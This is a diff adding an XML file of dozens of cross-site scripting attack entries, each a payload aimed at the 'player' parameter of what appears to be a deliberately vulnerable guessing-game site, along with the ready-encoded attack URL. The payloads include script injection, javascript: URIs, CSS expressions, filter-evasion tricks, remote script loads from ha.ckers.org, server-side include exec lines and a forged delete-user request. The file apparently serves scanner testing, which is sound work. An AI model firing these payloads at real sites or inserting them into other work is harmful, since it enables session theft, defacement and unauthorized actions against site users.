@@ -1,0 +1,1581 @@
+<xssAttacks>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT>alert('XSS')</SCRIPT></parameter>
+	<type name='XSS Injection Type'>SCRIPT w/Alert()</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT%3Ealert%28%27XSS%27%29%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT SRC=http://ha.ckers.org/xss.js></SCRIPT></parameter>
+	<type name='XSS Injection Type'>SCRIPT w/Source File</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT>alert(String.fromCharCode(88,83,83))</SCRIPT></parameter>
+	<type name='XSS Injection Type'>SCRIPT w/Char Code</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT%3Ealert%28String.fromCharCode%2888%2C83%2C83%29%29%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><BASE HREF="javascript:alert('XSS');//"></parameter>
+	<type name='XSS Injection Type'>BASE</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CBASE+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%2F%2F%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><BGSOUND SRC="javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>BGSOUND</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CBGSOUND+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><DIV STYLE="background-image: url(javascript:alert('XSS'))"></parameter>
+	<type name='XSS Injection Type'>DIV background-image 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CDIV+STYLE%3D%22background-image%3A+url%28javascript%3Aalert%28%27XSS%27%29%29%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><DIV STYLE="background-image: url(&#1;javascript:alert('XSS'))"></parameter>
+	<type name='XSS Injection Type'>DIV background-image 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CDIV+STYLE%3D%22background-image%3A+url%28%26%231%3Bjavascript%3Aalert%28%27XSS%27%29%29%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><DIV STYLE="width: expression(alert('XSS'));"></parameter>
+	<type name='XSS Injection Type'>DIV expression</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CDIV+STYLE%3D%22width%3A+expression%28alert%28%27XSS%27%29%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IFRAME SRC="javascript:alert('XSS');"></IFRAME></parameter>
+	<type name='XSS Injection Type'>IFRAME</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIFRAME+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E%3C%2FIFRAME%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><INPUT TYPE="IMAGE" SRC="javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>INPUT Image</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CINPUT+TYPE%3D%22IMAGE%22+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC="javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>IMG w/JavaScript Directive</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC=javascript:alert('XSS')></parameter>
+	<type name='XSS Injection Type'>IMG No Quotes/Semicolon</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3Djavascript%3Aalert%28%27XSS%27%29%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG DYNSRC="javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>IMG Dynsrc</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+DYNSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG LOWSRC="javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>IMG Lowsrc</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+LOWSRC%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC="http://www.thesiteyouareon.com/somecommand.php?somevariables=maliciouscode"></parameter>
+	<type name='XSS Injection Type'>IMG Embedded commands 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22http%3A%2F%2Fwww.thesiteyouareon.com%2Fsomecommand.php%3Fsomevariables%3Dmaliciouscode%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'>Redirect 302 /a.jpg http://victimsite.com/admin.asp&deleteuser</parameter>
+	<type name='XSS Injection Type'>IMG Embedded commands 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=Redirect+302+%2Fa.jpg+http%3A%2F%2Fvictimsite.com%2Fadmin.asp%26deleteuser</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><STYLE>li {list-style-image: url("javascript:alert('XSS')");}</STYLE><UL><LI>XSS</parameter>
+	<type name='XSS Injection Type'>List-style-image</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE%3Eli+%7Blist-style-image%3A+url%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CUL%3E%3CLI%3EXSS</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC='vbscript:msgbox("XSS")'></parameter>
+	<type name='XSS Injection Type'>IMG w/VBscript</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%27vbscript%3Amsgbox%28%22XSS%22%29%27%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><LAYER SRC="http://ha.ckers.org/scriptlet.html"></LAYER></parameter>
+	<type name='XSS Injection Type'>LAYER</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CLAYER+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FLAYER%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC="livescript:[code]"></parameter>
+	<type name='XSS Injection Type'>Livescript</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22livescript%3A%5Bcode%5D%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><META HTTP-EQUIV="refresh" CONTENT="0;url=javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>META</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CMETA+HTTP-EQUIV%3D%22refresh%22+CONTENT%3D%220%3Burl%3Djavascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC="mocha:[code]"></parameter>
+	<type name='XSS Injection Type'>Mocha</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22mocha%3A%5Bcode%5D%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><OBJECT TYPE="text/x-scriptlet" DATA="http://ha.ckers.org/scriptlet.html"></OBJECT></parameter>
+	<type name='XSS Injection Type'>OBJECT</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3COBJECT+TYPE%3D%22text%2Fx-scriptlet%22+DATA%3D%22http%3A%2F%2Fha.ckers.org%2Fscriptlet.html%22%3E%3C%2FOBJECT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><EMBED SRC="http://ha.ckers.org/xss.swf" AllowScriptAccess="always"></EMBED></parameter>
+	<type name='XSS Injection Type'>Embed Flash</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CEMBED+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.swf%22+AllowScriptAccess%3D%22always%22%3E%3C%2FEMBED%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><STYLE TYPE="text/javascript">alert('XSS');</STYLE></parameter>
+	<type name='XSS Injection Type'>STYLE</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE+TYPE%3D%22text%2Fjavascript%22%3Ealert%28%27XSS%27%29%3B%3C%2FSTYLE%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><XSS STYLE="xss:expression(alert('XSS'))"></parameter>
+	<type name='XSS Injection Type'>STYLE w/Anonymous HTML</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CXSS+STYLE%3D%22xss%3Aexpression%28alert%28%27XSS%27%29%29%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><STYLE>.XSS{background-image:url("javascript:alert('XSS')");}</STYLE><A CLASS=XSS></A></parameter>
+	<type name='XSS Injection Type'>STYLE w/background-image</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE%3E.XSS%7Bbackground-image%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%3B%7D%3C%2FSTYLE%3E%3CA+CLASS%3DXSS%3E%3C%2FA%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><STYLE type="text/css">BODY{background:url("javascript:alert('XSS')")}</STYLE></parameter>
+	<type name='XSS Injection Type'>STYLE w/background</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE+type%3D%22text%2Fcss%22%3EBODY%7Bbackground%3Aurl%28%22javascript%3Aalert%28%27XSS%27%29%22%29%7D%3C%2FSTYLE%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><LINK REL="stylesheet" HREF="javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>Stylesheet</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><LINK REL="stylesheet" HREF="http://ha.ckers.org/xss.css"></parameter>
+	<type name='XSS Injection Type'>Remote Stylesheet 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CLINK+REL%3D%22stylesheet%22+HREF%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.css%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><STYLE>@import'http://ha.ckers.org/xss.css';</STYLE></parameter>
+	<type name='XSS Injection Type'>Remote Stylesheet 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE%3E%40import%27http%3A%2F%2Fha.ckers.org%2Fxss.css%27%3B%3C%2FSTYLE%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><META HTTP-EQUIV="Link" Content="<http://ha.ckers.org/xss.css>; REL=stylesheet"></parameter>
+	<type name='XSS Injection Type'>Remote Stylesheet 3</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CMETA+HTTP-EQUIV%3D%22Link%22+Content%3D%22%3Chttp%3A%2F%2Fha.ckers.org%2Fxss.css%3E%3B+REL%3Dstylesheet%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><STYLE>BODY{-moz-binding:url("http://ha.ckers.org/xssmoz.xml#xss")}</STYLE></parameter>
+	<type name='XSS Injection Type'>Remote Stylesheet 4</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE%3EBODY%7B-moz-binding%3Aurl%28%22http%3A%2F%2Fha.ckers.org%2Fxssmoz.xml%23xss%22%29%7D%3C%2FSTYLE%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><TABLE><TD BACKGROUND="javascript:alert('XSS')"></TD></TABLE></parameter>
+	<type name='XSS Injection Type'>TD</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CTABLE%3E%3CTD+BACKGROUND%3D%22javascript%3Aalert%28%27XSS%27%29%22%3E%3C%2FTD%3E%3C%2FTABLE%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><HTML xmlns:xss> <?import namespace="xss" implementation="http://ha.ckers.org/xss.htc"> <xss:xss>XSS</xss:xss> </HTML></parameter>
+	<type name='XSS Injection Type'>XML namespace</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CHTML+xmlns%3Axss%3E+%3C%3Fimport+namespace%3D%22xss%22+implementation%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.htc%22%3E+%3Cxss%3Axss%3EXSS%3C%2Fxss%3Axss%3E+%3C%2FHTML%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><XSS STYLE="behavior: url(http://ha.ckers.org/xss.htc);"></parameter>
+	<type name='XSS Injection Type'>Local .htc file</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CXSS+STYLE%3D%22behavior%3A+url%28http%3A%2F%2Fha.ckers.org%2Fxss.htc%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT SRC="http://ha.ckers.org/xss.jpg"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Rename .js to .jpg</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.jpg%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><!--#exec cmd="/bin/echo '<SCRIPT SRC'"--><!--#exec cmd="/bin/echo '=http://ha.ckers.org/xss.js></SCRIPT>'"--></parameter>
+	<type name='XSS Injection Type'>SSI</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3CSCRIPT+SRC%27%22--%3E%3C%21--%23exec+cmd%3D%22%2Fbin%2Fecho+%27%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js%3E%3C%2FSCRIPT%3E%27%22--%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><? echo('<SCR)'; echo('IPT>alert("XSS")</SCRIPT>'); ?></parameter>
+	<type name='XSS Injection Type'>PHP</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3C%3F+echo%28%27%3CSCR%29%27%3B+echo%28%27IPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%27%29%3B+%3F%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC=JaVaScRiPt:alert('XSS')></parameter>
+	<type name='XSS Injection Type'>Case Insensitive</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3DJaVaScRiPt%3Aalert%28%27XSS%27%29%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC=javascript:alert(&quot;XSS&quot;)></parameter>
+	<type name='XSS Injection Type'>HTML Entities</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3Djavascript%3Aalert%28%26quot%3BXSS%26quot%3B%29%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC=`javascript:alert("RSnake says, 'XSS'")`></parameter>
+	<type name='XSS Injection Type'>Grave Accents</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%60javascript%3Aalert%28%22RSnake+says%2C+%27XSS%27%22%29%60%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC=javascript:alert(String.fromCharCode(88,83,83))></parameter>
+	<type name='XSS Injection Type'>Image w/CharCode</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3Djavascript%3Aalert%28String.fromCharCode%2888%2C83%2C83%29%29%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'>\";alert('XSS');//</parameter>
+	<type name='XSS Injection Type'>Escaping JavaScript escapes</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%5C%22%3Balert%28%27XSS%27%29%3B%2F%2F</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'></TITLE><SCRIPT>alert("XSS");</SCRIPT></parameter>
+	<type name='XSS Injection Type'>End title tag</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3C%2FTITLE%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><STYLE>@im\port'\ja\vasc\ript:alert("XSS")';</STYLE></parameter>
+	<type name='XSS Injection Type'>STYLE w/broken up JavaScript</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSTYLE%3E%40im%5Cport%27%5Cja%5Cvasc%5Cript%3Aalert%28%22XSS%22%29%27%3B%3C%2FSTYLE%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC="jav ascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>Embedded Tab</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22jav+ascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC="jav&#x09;ascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>Embedded Encoded Tab</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22jav%26%23x09%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC="jav&#x0A;ascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>Embedded Newline</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22jav%26%23x0A%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC="jav&#x0D;ascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>Embedded Carriage Return</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22jav%26%23x0D%3Bascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC = " j a v a s c r i p t : a l e r t ( ' X S S ' ) " ></parameter>
+	<type name='XSS Injection Type'>Multiline w/Carriage Returns</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC+%3D+%22+j+a+v+a+s+c+r+i+p+t+%3A+a+l+e+r+t+%28+%27+X+S+S+%27+%29+%22+%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'>perl -e 'print "<IMG SRC=java\0script:alert("XSS")>";'> out</parameter>
+	<type name='XSS Injection Type'>Null Chars 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=perl+-e+%27print+%22%3CIMG+SRC%3Djava%00script%3Aalert%28%22XSS%22%29%3E%22%3B%27%3E+out</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'>perl -e 'print "&<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out</parameter>
+	<type name='XSS Injection Type'>Null Chars 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=perl+-e+%27print+%22%26%3CSCR%00IPT%3Ealert%28%22XSS%22%29%3C%2FSCR%00IPT%3E%22%3B%27+%3E+out</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC=" &#14; javascript:alert('XSS');"></parameter>
+	<type name='XSS Injection Type'>Spaces/Meta Chars</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22+%26%2314%3B+javascript%3Aalert%28%27XSS%27%29%3B%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT/XSS SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Non-Alpha/Non-Digit</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT%2FXSS+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT SRC=http://ha.ckers.org/xss.js</parameter>
+	<type name='XSS Injection Type'>No Closing Script Tag</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fxss.js</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT SRC=//ha.ckers.org/.j></parameter>
+	<type name='XSS Injection Type'>Protocol resolution in script tags</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+SRC%3D%2F%2Fha.ckers.org%2F.j%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG SRC="javascript:alert('XSS')"</parameter>
+	<type name='XSS Injection Type'>Half-Open HTML/JavaScript</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+SRC%3D%22javascript%3Aalert%28%27XSS%27%29%22</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IFRAME SRC=http://ha.ckers.org/scriptlet.html <</parameter>
+	<type name='XSS Injection Type'>Double open angle brackets</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIFRAME+SRC%3Dhttp%3A%2F%2Fha.ckers.org%2Fscriptlet.html+%3C</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><<SCRIPT>alert("XSS");//<</SCRIPT></parameter>
+	<type name='XSS Injection Type'>Extraneous Open Brackets</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3C%3CSCRIPT%3Ealert%28%22XSS%22%29%3B%2F%2F%3C%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><IMG """><SCRIPT>alert("XSS")</SCRIPT>"></parameter>
+	<type name='XSS Injection Type'>Malformed IMG Tags</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CIMG+%22%22%22%3E%3CSCRIPT%3Ealert%28%22XSS%22%29%3C%2FSCRIPT%3E%22%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT>a=/XSS/ alert(a.source)</SCRIPT></parameter>
+	<type name='XSS Injection Type'>No Quotes/Semicolons</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT%3Ea%3D%2FXSS%2F+alert%28a.source%29%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT a=">" SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Evade Regex Filter 1</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+a%3D%22%3E%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT ="blah" SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Evade Regex Filter 2</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+%3D%22blah%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT a="blah" '' SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Evade Regex Filter 3</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+a%3D%22blah%22+%27%27+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
+<xss>
+	<method>GET</method>
+	<url>http://vicnum.ciphertechs.com/guessnum.html</url>
+	<parameter name='player'><SCRIPT "a='>'" SRC="http://ha.ckers.org/xss.js"></SCRIPT></parameter>
+	<type name='XSS Injection Type'>Evade Regex Filter 4</type>
+	<result>http://vicnum.ciphertechs.com/guessnum.html?player=%3CSCRIPT+%22a%3D%27%3E%27%22+SRC%3D%22http%3A%2F%2Fha.ckers.org%2Fxss.js%22%3E%3C%2FSCRIPT%3E</result>
+</xss>
